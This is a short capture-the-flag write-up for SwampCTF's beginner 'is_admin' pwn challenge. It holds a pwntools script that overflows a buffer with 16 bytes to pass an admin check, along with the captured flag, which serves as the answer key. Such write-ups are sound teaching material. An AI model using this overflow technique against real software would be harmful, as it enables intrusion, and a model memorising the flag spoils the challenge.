https://ctftime.org/event/2573

# beginner_pwn_1 (pwn)

Are you really admin?

This challenge serves as an introduction to pwn that new ctfers can use to grasp basic pwn concepts.

nc chals.swampctf.com 40004

## Solution

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./is_admin", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("chals.swampctf.com", 40004)

p.sendline(b"A" * 16)

p.sendline(b"y")

p.readuntil(b"swampCTF{")

print("swampCTF{" + p.readuntil(b"}").decode()) # swampCTF{n0t_@11_5t@ck5_gr0w_d0wn}
```

## Flag
`swampCTF{n0t_@11_5t@ck5_gr0w_d0wn}`

smiley 2025/03/29
